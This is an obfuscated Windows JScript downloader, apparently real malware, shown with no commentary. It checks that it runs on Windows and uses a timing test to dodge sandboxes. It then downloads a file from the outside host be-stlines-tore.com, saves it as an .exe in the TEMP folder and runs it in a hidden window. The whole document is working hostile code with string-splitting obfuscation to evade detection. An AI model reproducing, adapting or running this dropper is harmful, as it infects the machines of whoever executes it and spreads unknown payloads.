var G0 = false;
var T0 = "Create"+"Object";
var MT = function LS() {return WScript[T0]("WScript"+".Shell");}(), B1 = 11;
var IK = "MSXML2"+".XMLHTTP";
var WD = 2;
var RX = WD - 2;
function G(QC){MT["Run"](QC, RX, RX);};
function T(){return IK + "";};
function Z(Y, ZA){RX = RX * 1; return Y - ZA;};
function SK(){return T0;};
/*@cc_on
  @if (@_win32 || @_win64)
    G0 = true;
  @end
@*/
if (G0)
{
var U = "";
function A(){return 22;};
var L0 = 0; var M0 = 0;
function PR()
{
var L = new this["Date"]();
var HS = L["getUTCMilliseconds"]();
WScript["Sleep"](A());
var L = new this["Date"]();
var E = L["getUTCMilliseconds"]();
WScript["Sleep"](A());
var L = new this["Date"]();
var NJ = L["getUTCMilliseconds"]();
var L0 = "M";
L0 = Z(E, HS);
var M0 = "R";
M0 = Z(NJ, E);
U = "open";
return Z(L0, M0);
}
var PU = false;
var PA = false;
for (var U0 = RX; U0 < A() * 1; U0++){if (PR() != RX){
PU = true; 
M0 = "31" + 11 * L0 + M0; 
PA = true; 
break;
}}
function CA() {return ((PU == true) && (PU == PA)) ? 1 : RX;};
if (PU && CA() && PA){
function GI() {return MT["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "epfG5oDHj.ex" + "e";};
 Q = T();
 PT = WScript[T0](Q);
 var B0 = 1;
do { 
	for (;B0;){
	try {
		if (B0 == 1)
		{
			PT[U]("GET", "http://be-stlines-tore.com/k3soa", false);
			PT["send"]();
			MN = "Sleep";
			B0 = 2;
		}
		WScript[MN](A() + 120); 
		if (PT["readystate"] < 2 * 2) continue;
		B0 = RX;
		function PL(K) {var UZ = (1, 2, 3, 4, 5, K); return UZ;};
		YY = WScript[SK()]("ADODB.Stream");
		Q = YY;
		Q[U]();
		Q["type"] = PL(1);
		Q["write"](PT["ResponseBody"]);
		YY["position"] = PL(RX);
		Q["Save" + "ToFile"](GI(), 2);
		YY["cl"+"ose"]();
		B = GI();
		G(B);
	} catch(S){};};
}while (B0);
}
}

